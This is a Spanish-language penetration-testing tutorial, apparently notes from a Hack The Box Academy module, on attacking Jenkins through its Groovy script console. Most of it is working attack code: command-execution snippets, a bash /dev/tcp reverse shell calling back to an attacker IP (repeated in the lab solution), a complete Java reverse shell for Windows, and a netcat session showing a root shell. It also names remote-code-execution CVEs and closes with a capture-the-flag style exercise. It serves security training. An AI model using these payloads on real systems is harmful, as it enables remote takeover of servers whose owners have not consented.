
# Jenkins - Ataques

## <mark style="color:purple;">Atacando a Jenkins</mark>

***

Hemos confirmado que el host está ejecutando Jenkins y está configurado con credenciales débiles. Verifiquemos qué tipo de acceso nos brindará esto.

Una vez que hayamos obtenido acceso a una aplicación Jenkins, una forma rápida de lograr la ejecución de comandos en el servidor subyacente es a través de la [consola de scripts](https://www.jenkins.io/doc/book/managing/script-console/) . La consola de scripts nos permite ejecutar scripts Groovy arbitrarios dentro del entorno de ejecución del controlador Jenkins. Esto se puede aprovechar para ejecutar comandos del sistema operativo en el servidor subyacente. Jenkins se instala a menudo en el contexto de la cuenta raíz o SYSTEM, por lo que puede ser una victoria fácil para nosotros.

***

## <mark style="color:purple;">Script Console</mark>

Se puede acceder a la consola de scripts en la URL `http://jenkins.inlanefreight.local:8000/script`. Esta consola permite al usuario ejecutar scripts de Apache [Groovy](https://en.wikipedia.org/wiki/Apache_Groovy) , que son un lenguaje orientado a objetos compatible con Java. El lenguaje es similar a Python y Ruby. El código fuente de Groovy se compila en Java Bytecode y puede ejecutarse en cualquier plataforma que tenga instalado JRE.

Con esta consola de scripts, es posible ejecutar comandos arbitrarios, que funcionan de manera similar a un shell web. Por ejemplo, podemos usar el siguiente fragmento para ejecutar el comando `id`.

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

<figure><img src="https://academy.hackthebox.com/storage/modules/113/groovy_web.png" alt=""><figcaption></figcaption></figure>

Existen varias formas de aprovechar el acceso a la consola de scripts para obtener un reverse shell. Por ejemplo, utilizando el comando que aparece a continuación o [este](https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/) módulo de Metasploit.

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.15.59/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

La ejecución de los comandos anteriores da como resultado una conexión de reverse shell.

```shell-session
afsh4ck@kali$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844

id

uid=0(root) gid=0(root) groups=0(root)

/bin/bash -i

root@app02:/var/lib/jenkins3#
```

En un host Windows, podríamos intentar agregar un usuario y conectarnos al host a través de RDP o WinRM o, para evitar realizar un cambio en el sistema, usar un soporte de descarga de PowerShell con [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) . Podríamos ejecutar comandos en una instalación de Jenkins basada en Windows usando este fragmento:

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

También podríamos usar [este](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) reverse shell de Java para obtener la ejecución de comandos en un host de Windows, intercambiando `localhost` y el puerto por nuestra dirección IP y el puerto de escucha.

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

***

## <mark style="color:purple;">Vulnerabilidades varias</mark>

Existen varias vulnerabilidades de ejecución remota de código en varias versiones de Jenkins. Un exploit reciente combina dos vulnerabilidades, CVE-2018-1999002 y [CVE-2019-1003000,](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266) para lograr una ejecución remota de código autenticada previamente, evadiendo la protección de la zona protegida de seguridad de scripts durante la compilación de scripts. Existen PoC de exploits públicos para explotar una falla en el enrutamiento dinámico de Jenkins para evadir la ACL de lectura/general y usar Groovy para descargar y ejecutar un archivo JAR malicioso. Esta falla permite a los usuarios con permisos de lectura evadir las protecciones de la zona protegida y ejecutar código en el servidor maestro de Jenkins. Este exploit funciona contra la versión 2.137 de Jenkins.

Existe otra vulnerabilidad en Jenkins 2.150.2, que permite a los usuarios con privilegios de creación de JOB y BUILD ejecutar código en el sistema a través de Node.js. Esta vulnerabilidad requiere autenticación, pero si se habilitan usuarios anónimos, la explotación tendrá éxito porque estos usuarios tienen privilegios de creación de JOB y BUILD de forma predeterminada.

Como hemos visto, obtener acceso a Jenkins como administrador puede llevar rápidamente a la ejecución remota de código. Si bien existen varios exploits de RCE que funcionan para Jenkins, son específicos de la versión. Al momento de escribir este artículo, la versión LTS actual de Jenkins es 2.303.1, que corrige los dos fallos detallados anteriormente. Como con cualquier aplicación o sistema, es importante reforzar Jenkins tanto como sea posible, ya que la funcionalidad incorporada se puede usar fácilmente para tomar el control del servidor subyacente.

***

## <mark style="color:purple;">Seguimos adelante</mark>

Hemos analizado varias formas en las que se pueden utilizar de forma abusiva los CMS y los contenedores de servlets o las aplicaciones de desarrollo de software más populares para explotar tanto las vulnerabilidades conocidas como las funciones integradas. Ahora, centrémonos un poco en dos herramientas de monitorización de infraestructuras y redes muy conocidas: Splunk y PRTG Network Monitor.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo(s): 10.129.201.58 (ACADEMY-ATCKAPPS-APP02) 

vHosts necesarios para estas preguntas:
jenkins.inlanefreight.local
```

> Ataca el objetivo de Jenkins y obtén la ejecución remota del código. Envía el contenido del archivo flag.txt en el directorio /var/lib/jenkins3

Vamos a usar el script console con el siguiente script en groovy:

```groovy
def cmd = 'cat /var/lib/jenkins3/flag.txt'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

<figure><img src="/files/Q8kecA6jKIcsjwtmFWuO" alt=""><figcaption></figcaption></figure>

De igual manera también podemos conseguir un RCE con el siguiente script:

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.15.59/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

<figure><img src="/files/wqbdo3PyLZgkipFlOwk0" alt=""><figcaption></figcaption></figure>
